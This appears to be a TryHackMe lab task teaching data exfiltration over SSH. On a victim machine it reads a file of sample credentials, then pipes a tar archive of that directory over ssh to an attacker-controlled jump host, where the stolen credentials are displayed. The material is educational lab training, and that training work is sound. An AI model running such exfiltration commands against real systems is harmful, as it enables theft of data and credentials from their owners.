In this task we will show how to use SSH protocol to exfiltrate data over to an attacking machine. SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.

![Encrypted SSH communication channel](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa723bb0e2c39dfc936b135c4912d1cf.png)  

To transfer data over the SSH, we can use either the Secure Copy Protocol SCP or the SSH client. Let's assume that we don't have the SCP command available to transfer data over SSH. Thus, we will focus more on the SSH client in this task.  

As we mentioned earlier, an attacker needs to control a server, which in this case has an SSH server enabled, to receive the exfiltrated data. Thus, we will be using the AttackBox as our SSH server in this scenario. You can also use the JumpBox since it has an SSH server enabled.  

Let's assume that we have gained access to sensitive data that must be transmitted securely.  Let's connect to the victim1 or victim2 machine.

The data that needs to be transferred  

```

thm@victim1:~$ cat task5/creds.txt admin:password Admin:123456 root:toor

```

Let's use the same technique we discussed in the "exfiltration using a TCP socket" task, where we will be using the tar command to archive the data and then transfer it.

Exfiltration data from the victim1 machine  

```
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"

```

Let's break down the previous command and explain it:  

1.  We used the tar command the same as the previous task to create an archive file of the task5 directory.
2.  Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
3.  We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

If we check the attacker machine, we can see that we have successfully transmitted the file.

Checking the received data  

 ```
 thm@jump-box$ cd /tmp/task5/ 
 thm@jump-box:/tmp/task5$ cat creds.txt 
 admin:password 
 Admin:123456 
 root:toor
```